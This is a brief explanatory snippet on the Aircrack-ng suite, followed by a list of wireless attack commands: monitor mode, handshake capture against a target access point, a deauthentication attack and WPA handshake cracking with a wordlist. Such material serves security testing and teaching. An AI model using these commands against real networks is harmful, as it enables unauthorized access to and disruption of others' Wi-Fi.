What is Aircrack-ng?

Aircrack-ng is a complete suite of tools to assess Wi-Fi network security. It is used for monitoring, attacking, testing, and cracking WEP/WPA/WPA2 wireless networks.

Common Wireless Attack Commands

# Enable monitor mode airmon-ng start wlan0 # Capture packets airodump-ng wlan0mon # Capture handshake for target airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon # Deauthentication attack aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon # Crack WPA handshake aircrack-ng -w rockyou.txt capture-01.cap
